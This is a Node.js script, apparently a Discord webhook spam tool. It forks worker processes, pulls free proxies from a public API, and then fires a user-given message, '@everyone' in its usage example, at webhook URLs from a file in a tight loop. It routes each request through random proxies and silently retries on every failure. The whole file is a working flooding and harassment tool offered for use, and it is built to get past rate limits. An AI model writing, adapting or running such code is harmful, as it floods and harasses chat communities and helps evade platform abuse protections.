const axios = require("axios");
const cluster = require('cluster');
var random_useragent = require('random-useragent');
const path = require('path');
const fs = require('fs');
const HttpsProxyAgent = require('https-proxy-agent')

const time = process.argv[4];
const threads = process.argv[3];
var contents = process.argv[2];
let timecount = 1;

let webhooks = fs.readFileSync('webhooks.txt', 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);


async function register(proxies){
	let webhook = webhooks[Math.floor(Math.random() * webhooks.length)];
	let proxy = proxies[Math.floor(Math.random() * proxies.length)];
	var agent = new HttpsProxyAgent('http://'+proxy);

	await axios({
		method: 'post',
		httpsAgent: agent,
		url: webhook,
		data:{
			content:contents,
		},
	}).then(function (response) {
		console.log("Count",timecount,proxy);
		timecount++;
		if (timecount == 99999){
			process.exit(0);
		}

	}).catch(function (error) {
		register(proxies)
	})


};

function run(proxies) {
	setInterval(() => {
		register(proxies);
	}); 
}

async function proxyget() {

	const proxygets = await axios.get('https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all')
	var proxygetspass = proxygets.data
	fs.writeFile('proxy.txt',proxygetspass, function (err,results) {
		if (err) return console.log("Can't Get Proxy");
		let proxies = fs.readFileSync('proxy.txt', 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);
		run(proxies);
	});

}

function main(){
	if (process.argv.length !== 5) {
		console.log(`                       
			Usage: node ${path.basename(__filename)} <contents> <thread> <time>
			Usage: node ${path.basename(__filename)} @everyone 1 300
			`);
		process.exit(0);
	}else{
		if (cluster.isMaster) {
			for (let i = 0; i < threads; i++) {
				cluster.fork();
			}
			cluster.on('exit', (worker, code, signal) => {
				console.log(`Threads: ${worker.process.pid} ended`);
			});
		} else {
			proxyget();
			console.log(`Threads: ${process.pid} started`);
		}
	}
}


setTimeout(() => {
	console.log('Send ended.');
	process.exit(0)
}, time * 1000);



process.on('uncaughtException', function (err) {
	// console.log(err);
});
process.on('unhandledRejection', function (err) {
	// console.log(err);
});

main();

